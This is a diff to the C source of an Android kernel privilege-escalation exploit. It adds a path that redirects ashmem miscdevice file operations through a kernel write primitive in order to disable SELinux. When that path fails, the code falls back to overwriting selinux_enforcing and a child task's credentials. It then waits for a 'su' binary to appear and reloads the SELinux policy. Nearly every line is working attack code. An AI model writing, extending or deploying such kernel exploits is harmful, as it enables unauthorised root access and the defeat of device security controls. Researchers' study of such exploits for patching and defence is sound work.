@@ -454,9 +454,26 @@ int run_exploit(int argc, char **argv) {
 
   write_root_script();
 
-  /* Phase 1: Disable SELinux */
+  /* Phase 1: Disable SELinux (+ optional fops redirect for UMH path) */
   int selinux_ok = check_selinux_off();
-  if (!selinux_ok) {
+  int umh_available = active_offsets &&
+      active_offsets->off_system_unbound_wq &&
+      active_offsets->off_ashmem_misc_fops;
+
+  if (!selinux_ok && umh_available) {
+    /* UMH path: mode=4 redirects miscdevice fops via W0's pi_tree.
+     * miscdevice starts at ASHMEM_FOPS_PTR (repr(transparent) Registration).
+     * fops at miscdevice+0x10 = ASHMEM_MISC_FOPS. */
+    pr_info("UMH path: fops redirect (mode=4)...\n");
+    slab_drain();
+    TIMER("pre-UMH drain");
+    do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
+    TIMER("fops redirect done");
+    selinux_ok = check_selinux_off();
+  }
+
+  if (!selinux_ok && !root_child_done) {
+    /* Fallback: direct PI write to selinux_enforcing */
     slab_drain();
     TIMER("pre-W1 drain");
     for (int att = 1; att <= 5 && !selinux_ok; att++) {
@@ -467,11 +484,31 @@ int run_exploit(int argc, char **argv) {
     }
     if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
     TIMER("Write 1 complete");
+  } else if (!selinux_ok && root_child_done) {
+    selinux_ok = 1;
   } else {
-    pr_success("SELinux already off\n");
+    pr_success("SELinux off (UMH or already)\n");
   }
 
-  /* Phase 2: Find child task_struct + cred overwrite */
+  /* Phase 2: Check if UMH root succeeded */
+  if (root_child_done) {
+    pr_success("UMH root done — skipping W2\n");
+    TIMER("exploit complete (UMH)");
+    pr_info("waiting for su...\n");
+    for (int i = 0; i < 60; i++) {
+      if (system("su -c 'id' > /dev/null 2>&1") == 0) {
+        pr_success("su ready, fixing SELinux policy\n");
+        system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
+        pr_success("load_policy done\n");
+        break;
+      }
+      sleep(1);
+    }
+    return 0;
+  }
+
+  /* Phase 2 fallback: Find child task_struct + cred overwrite */
+  pr_info("UMH not available, falling back to W2 cred path\n");
   slab_drain();
   TIMER("pre-W2 drain");
 
@@ -485,7 +522,6 @@ int run_exploit(int argc, char **argv) {
   TIMER("perf_find_task done");
 
   if (!child_task) {
-    /* perf failed (seccomp?) — retry once */
     pr_info("perf returned 0, retrying...\n");
     waitpid(child, NULL, 0);
     child = spawn_child(&pipes);
@@ -529,7 +565,6 @@ int run_exploit(int argc, char **argv) {
   sleep(2);
   TIMER("exploit complete");
 
-  /* Wait for KSU su to become available, then fix SELinux policycap */
   pr_info("waiting for su...\n");
   for (int i = 0; i < 60; i++) {
     if (system("su -c 'id' > /dev/null 2>&1") == 0) {
@@ -628,6 +663,7 @@ static int run_write1_only(void) {
 }
 
 int main(int argc, char **argv) {
+    handle_umh_mode(argc, argv);
     if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0)
         return run_bootstrap();
     if (argc > 1 && strcmp(argv[1], "--write1") == 0)
